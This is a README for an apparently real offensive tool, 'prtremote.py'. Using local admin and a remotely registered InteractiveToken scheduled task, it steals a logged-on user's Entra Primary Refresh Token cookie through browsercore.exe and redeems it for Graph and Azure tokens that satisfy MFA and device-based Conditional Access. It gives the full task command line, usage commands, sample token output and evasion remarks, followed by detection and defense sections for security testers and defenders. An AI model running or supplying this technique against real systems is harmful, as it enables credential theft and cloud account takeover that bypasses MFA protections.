# PRTremote

Primary Refresh Tokens (PRTs) are bound to a user's logon session - PRT SSO cookies, exchanged for Graph/Azure/etc API tokens, can only be requested from inside that logon session. This is a frequent pain point for PRT extraction in hybrid-AD attacks, typically requiring some technique of token theft or remote process injection.

Scheduled tasks have an **InteractiveToken** `LogonType`. This logon will execute the task within the user's existing interactive session, without the need for that user's password or hash. All you need is local admin to register the task remotely.

With in-session execution, we can request a nonce and use `browsercore.exe` to retrieve a PRT cookie and exchange it for Graph/Azure/etc tokens.

Requires `impacket` and `requests`.

## Typical flow

1. Establish local admin on an endpoint.
2. `check` — is it Entra-registered, and who's logged on right now?
3. Cross-reference logged-on users against interesting cloud identities (Entra role holders, hybrid-synced admins).
4. `dump` that user — harvest their PRT cookie.
5. `auth` — redeem it promptly; the cookie lasts ~5 minutes.

## `prtremote.py check`

Reads over MS-RRP: Entra registration (`HKLM\SYSTEM\...\CloudDomainJoin\JoinInfo`) and live sessions (hives loaded under `HKEY_USERS`, named via `ProfileList`). Starts RemoteRegistry if stopped and restores it after.

```bash
python prtremote.py check ENDPOINT/Administrator:"$PASSWORD"@192.168.122.64
```

```
[*] Connecting to 192.168.122.64 (192.168.122.64)

[*] Target ............... 192.168.122.64
[*] Entra registered ..... YES
[*]   Device key(s) ...... 4c1f8a2b-...
[*]   Tenant ID(s) ....... 8b1c9d0e-...
[*] Live sessions ........ 1
[*]   achen .............. S-1-12-1-1234567890-...

[*] Harvest with: prtremote.py dump ENDPOINT/Administrator:"$PASSWORD"@192.168.122.64 -run-user achen
```

## `prtremote.py dump`

BrowserCore is a native-messaging host — one length-prefixed JSON message in on stdin, one out on stdout — and the server nonce is anonymous, so the whole request can be built here and simply redirected in from a file:

1. Fetch a nonce (`grant_type=srv_challenge`) locally.
2. Frame the `GetCookies` request (4-byte LE length + UTF-8 JSON) and upload it over `C$` to `formatted_nonce.txt` on the run-user's Desktop.
3. Register `\PRTRemoteTask`, whose action is `cmd.exe /d /s /c ""%windir%\BrowserCore\browsercore.exe" < formatted_nonce.txt > prt_cookie.txt"`, running as `-run-user` / `InteractiveToken`.
4. Poll `C$` for the response, using its length prefix to tell "complete" from "still being written".
5. Parse the cookie out locally, delete both remote files, print the `auth` command to redeem it.

Nothing of ours executes: no `powershell.exe -EncodedCommand`, no script-block or AMSI telemetry, no dropped executable. Just `cmd.exe`, a signed Microsoft binary, and a data file.

`-run-user`'s domain prefix is optional.

```bash
python prtremote.py dump ENDPOINT/Administrator:"$PASSWORD"@192.168.122.64 -run-user achen
```

```
[*] Connecting to 192.168.122.64 (192.168.122.64)
[*] Nonce fetched from login.microsoftonline.com
[*] Uploaded a 161-byte request; the task will run:
[*]   cmd.exe /d /s /c ""%windir%\BrowserCore\browsercore.exe" < "C:\Users\achen\Desktop\formatted_nonce.txt" > "C:\Users\achen\Desktop\prt_cookie.txt""
[*] Registering task \PRTRemoteTask (runs as achen / InteractiveToken)
[*] Running task on demand (only fires while achen is logged on interactively)
[*] Task ran (last result 0x0)
[*] Deleting task \PRTRemoteTask
[*] Waiting for the response (up to 45s)
[*] Response complete after 2s (1518 bytes)
[*] Removed the request and response files from the target

[*] Target ............... 192.168.122.64
[*] Run-user ............. achen
[*] Cookie file .......... /path/to/prt_cookie_192.168.122.64_achen.txt
[*] Cookie length ........ 1420 chars

[*] Redeem now -- the cookie is only valid for about 5 minutes:
[*]   prtremote.py auth --prt /path/to/prt_cookie_192.168.122.64_achen.txt --graph
```

Flags: `-timeout`, `-poll`.

The on-target paths (`formatted_nonce.txt` and `prt_cookie.txt`, both on the run-user's Desktop), the task name (`\PRTRemoteTask`) and the local cookie file (`./prt_cookie_<host>_<user>.txt`) are fixed.
Exit codes: `0` cookie retrieved, `2` no response file appeared (user most likely not logged on), `3` harvest failed, `1` error.

## `prtremote.py auth`

Cookie → tokens. Talks only to Entra: no target, no credentials, no local admin, no browser.

```bash
python prtremote.py auth --prt prt_cookie_192.168.122.64_achen.txt --graph
```

```
[*] Redeeming prt_cookie_192.168.122.64_achen.txt for https://graph.microsoft.com
[*] Cookie accepted, authorization code issued
{
  "_clientId": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
  "accessToken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
  "expiresIn": 4082,
  "expiresOn": "2026-08-06 15:20:34",
  "idToken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0...",
  "refreshToken": "1.AVoAf6cUVMoCy0S7mo...",
  "tenantId": "5414a77f-02ca-44cb-bb9a-8b597cabc8dd",
  "tokenType": "Bearer"
}
[*] Tokens for achen@contoso.com in tenant 5414a77f-..., valid until 2026-08-06 15:20:34
[*] Saved to tokens_achen_graph.json
```

`--graph` gets `https://graph.microsoft.com`, `--azure` gets `https://management.azure.com`; `-f` overrides the default `./tokens_<user>_<graph|azure>.json`. The JSON goes to stdout and the `[*]` narration to stderr, so `auth ... | jq -r .accessToken` pipes cleanly.

This is the flow `roadtx gettokens --prt-cookie` runs, reimplemented in ~60 lines so the repo needs no roadtools install: read `request_nonce` out of the cookie's JWT body, `GET /common/oauth2/authorize` with the cookie set as `x-ms-RefreshTokenCredential`, take the `code` off the 302, redeem it at `/token`. The client is Azure CLI (`04b07795-…`) with its registered broker redirect — the same pair roadtx defaults to. `browserprtauth` drives a real browser and mints its own nonce, which is what you want when you hold a *PRT plus session key*; with a nonce-bound cookie it is strictly more moving parts, and slower against a 5-minute deadline.

The tokens inherit the PRT's `amr` claims (MFA included) and its `deviceid`, so they satisfy Conditional Access policies requiring strong auth or a compliant device.

The token file uses roadlib's shape, so roadtools reads it directly — including pivoting to another resource on the refresh token, long after the cookie has died:

```bash
roadtx refreshtokento -r https://management.azure.com --tokenfile tokens_achen_graph.json
roadrecon gather -f tokens_achen_graph.json
```

## Detection

The technique is remote Scheduled Task registration, so the task is the most reliable signal.

| Source | Event | What to look for |
| --- | --- | --- |
| Security | `4698` | Task created. The event carries the full task XML — a `<Principal>` with `<LogonType>InteractiveToken</LogonType>` for a user *other than* the account that registered the task is an unusual combination. |
| Security | `4699` | Task deleted. `dump` registers, runs and deletes within seconds; a 4698/4699 pair that close together, for a task created over the network, is worth alerting on. |
| Security | `4624` | The type 3 network logon that registered the task, correlated by time and source address. |
| Task Scheduler/Operational | `200` / `201` | Action started and completed, with the executed command line. |

Process ancestry is a second signal, though a weaker one. `browsercore.exe` is a native
messaging host, so its expected parents are the browsers that use it for SSO —
`msedge.exe`, `chrome.exe` with the Microsoft SSO extension, and Firefox v91+ with
Windows SSO enabled. A parent of `cmd.exe` or `svchost.exe` is anomalous. Baseline your
own fleet rather than trusting that list.

That signal is bypassable: the COM interface `browsercore.exe` wraps
(`IProofOfPossessionCookieInfoManager::GetCookieInfoForUri`, served by
`MicrosoftAccountTokenProvider.dll`) can be called in-process, which spawns nothing at
all. Task registration remains the durable detection.

On the file side, `dump` writes two files to the target user's Desktop and removes them
when it finishes. A short-lived `formatted_nonce.txt` / `prt_cookie.txt` pair, written
over SMB by an administrative session, is a high-fidelity artifact for anything watching
file creation on `C$`.

## Defense

The technique needs a live interactive session belonging to a user worth stealing from,
so the most effective controls remove the target rather than the technique:

- **Administrative tiering.** Keep privileged accounts off general-purpose workstations.
  A PRT is only as valuable as the identity behind it.
- **Conditional Access sign-in frequency.** Limits how long a harvested `amr` claim stays
  useful once redeemed.
- **Token protection / device-bound session credentials**, where available, narrow what a
  lifted cookie can be replayed against.
- **Restrict remote Scheduled Task registration.** The task is created over `\pipe\atsvc`
  by a member of the local Administrators group; anything that limits remote
  administrative logon (LAPS, Remote Credential Guard, host firewall rules on 445)
  removes the delivery path.

Harvested cookies expire in roughly five minutes, but the tokens they produce do not.
Incident response should assume the refresh token issued alongside the access token is
still live, and revoke the user's sessions explicitly.

---

*`check` and `dump` need local admin on the target; `auth` needs only the cookie. Authorized security testing on systems you own or are permitted to assess.*
